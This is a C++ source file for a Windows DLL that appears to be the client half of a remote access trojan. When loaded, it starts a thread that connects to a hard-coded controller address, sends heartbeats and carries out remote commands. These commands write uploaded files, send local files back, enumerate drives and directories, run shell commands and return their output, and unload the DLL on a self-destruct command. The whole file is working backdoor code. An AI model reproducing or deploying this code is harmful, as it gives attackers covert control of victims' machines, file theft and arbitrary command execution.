#include "pch.h"

#include "..\MyCRT\MyCRT.h"
#pragma comment(lib,"MyCRT")

#include "MyDEBUG.h"
#include "number.h"
#include "MyPacket.h"
#include "RWF.H"

#define HEARTBEAT_TIME 5000
#define IP "127.0.0.1"
#define PORT 9999

#define MyCreateThread(lpStartAddress,lpParameter) CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)lpStartAddress,(LPVOID)lpParameter,0,NULL)
MySocket* s = NULL;//因为没有CRT所以不能直接把类声明为全局变量
HANDLE mut = 0;
HMODULE g_hDll;
HANDLE hSendHEARTBEAT = 0;

bool InitSock() {
    if (s != NULL) {
        HeapFree(GetProcessHeap(), 0, s);
    }
    s = (MySocket*)HeapAlloc(GetProcessHeap(), 0, sizeof(MySocket));
    if(s->MySocketInit(mut)) return false;//模拟C++初始化类
    return true;
}

DWORD WINAPI SendHEARTBEAT(LPVOID lpThreadParameter) {
    MySocket* sh = s->New();
    if (sh == NULL)
        return 0;
    while (true) {
        if (!sh->Send(HEARTBEAT)) {
            MyFree(sh);
            return 1;
        }
        Sleep(HEARTBEAT_TIME);
    }
    return 0;
}

DWORD WINAPI RecvPacket(LPVOID lpThreadParameter) {
conn:
    while (!s->Connect(IP, PORT)) {
        MyDebug("Recv Error %d", WSAGetLastError());
        Sleep(1000);
    }
    if (hSendHEARTBEAT != 0) {
        TerminateThread(hSendHEARTBEAT, 0);
    }
    hSendHEARTBEAT = MyCreateThread(SendHEARTBEAT, 0);

    while(true){
        int r = s->Recv();
        //setsockopt SO_REUSEADDR立刻复用端口
        if(r == 2 || r == 0) {//连接正常关闭 || 连接或处理封包出错
            fail:
            MyDebug("Recv Error %d", WSAGetLastError());
            s->Free();
            goto conn;
        }
        UINT32 command;
        if (!s->ReadUint32(&command)) { MyDebug("ReadUint32 failed");goto fail; }
        switch (command) {
        case UPLOAD: {
            wchar_t* str;
            if (!s->ReadString(&str)) { MyDebug("ReadString failed"); goto fail; }
            void* buf; size_t l;
            if (!s->ReadBytes(&buf, &l)) { MyDebug("ReadBytes failed"); goto fail; }
            {
                RWF f;
                if (f.openFile(str, CREATE_ALWAYS) && f.write(buf, l) == l) {
                    s->WriteUint32(SUCCESS);
                }
                else {
                    s->WriteUint32(FAIL);
                }
                if (!s->Send(CLIENT_PACKET)) { goto fail; }
            }
            break;
        }
        case DOWNLOAD: {
            wchar_t* str;
            void* buf; size_t l;
            if (!s->ReadString(&str)) { MyDebug("ReadString failed"); goto fail; }
            {
                RWF f;
                if (f.openFile(str)) {
                    l = f.getFileSize();
                    buf = MyAlloc(l);
                    if (buf == NULL)
                        goto DOWNLOAD_FAIL;
                    if (f.read(buf, l) != l)
                        goto DOWNLOAD_FAIL;
                    s->WriteUint32(SUCCESS);
                    s->WriteBytes(buf, l);
                }
                else {
                DOWNLOAD_FAIL:
                    s->WriteUint32(FAIL);
                }
                if (!s->Send(CLIENT_PACKET)) { goto fail; }
            }
            break;
        }
        case LSF: {
            wchar_t* str;
            wchar_t sPath[MAX_PATH] = {0};
            WIN32_FIND_DATA fdFile = {0};
            HANDLE hFind = NULL;
            if(!s->ReadString(&str)){ MyDebug("ReadString failed"); goto fail; }
            if (0 == MyStrLenW(str)) {
                wchar_t disk[4] = L"C:\\";
                DWORD v = GetLogicalDrives();
                if (v == 0) {
                    MyDebug("GetLogicalDrivers failed"); goto LSF_CLOSE;
                }
                for (int i = 0; i < 26; i++) {
                    if (v & 1 != 0) {
                        disk[0] = 'A' + i;
                        s->WriteUint32(0);
                        s->WriteString(disk);
                    }
                    v >>= 1;
                }
                s->WriteUint32(0xffffffff);//END
                if (!s->Send(CLIENT_PACKET)) { goto fail; }
            }else{
                if (MyStrLenW(str) >= MAX_PATH || MyStrLenW(str) < 3) { MyDebug("Wrong Str"); goto LSF_CLOSE; }
                MyStrCpyW(sPath, str);
                MyStrAddW(sPath, L"\\*.*");

                if ((hFind = FindFirstFileW(sPath, &fdFile)) == INVALID_HANDLE_VALUE)
                {
                    MyDebug("Path not found: [%s]\n", sPath);
                    goto LSF_CLOSE;
                }
                do
                {
                    //Find first file will always return "." and ".." as the first two directories. 
                    if (!MyStrCmpW(fdFile.cFileName, L".")
                        && !MyStrCmpW(fdFile.cFileName, L"..")) {
                        s->WriteUint32(fdFile.dwFileAttributes);//FILE_ATTRIBUTE_DIRECTORY
                        s->WriteString(fdFile.cFileName);
                    }
                } while (FindNextFileW(hFind, &fdFile)); //Find the next file. 
                FindClose(hFind);
            LSF_CLOSE:
                s->WriteUint32(0xffffffff);//END
                if (!s->Send(CLIENT_PACKET)) { goto fail; }
            }
            break;
        }
        case CMD: {
            wchar_t* cmd; wchar_t* dir; UINT32 w = 0;
            char output[2048] = { 0 };
            if (!s->ReadUint32(&w)) { MyDebug("ReadUint32 failed"); goto fail; }
            if (!s->ReadString(&cmd)) { MyDebug("ReadString failed"); goto fail; }
            if (!s->ReadString(&dir)) { MyDebug("ReadString failed"); goto fail; }
            if (PipeCmd(cmd, MyStrLenW(dir) == 0 ? NULL : dir, output, sizeof(output), (bool)w)) {
                s->WriteUint32(SUCCESS);
                if (w)
                    s->WriteBytes(output, (MyStrLen(output) + 1) * sizeof(char));
            }
            else {
                s->WriteUint32(FAIL);
            }
            if(!s->Send(CLIENT_PACKET)){ goto fail; }
            break;
        }
        case SUICIDE: {
            TerminateThread(hSendHEARTBEAT, 0);
            CloseHandle(hSendHEARTBEAT);
            //TerminateThread(hRecvPacket, 0);
            //CloseHandle(hRecvPacket);
            FreeLibraryAndExitThread(g_hDll, 0);
            break;
        }
        }
    }
    return 0;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        MyDebug("start");

        g_hDll = hModule;
        mut = CreateMutex(NULL, NULL, NULL);
        InitSock();
        CloseHandle(MyCreateThread(RecvPacket, 0));
        //MessageBoxA(0, "OK", "", MB_OK);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        s->Free();
        HeapFree(GetProcessHeap(), 0, s);
        CloseHandle(mut);
        break;
    }
    return TRUE;
}

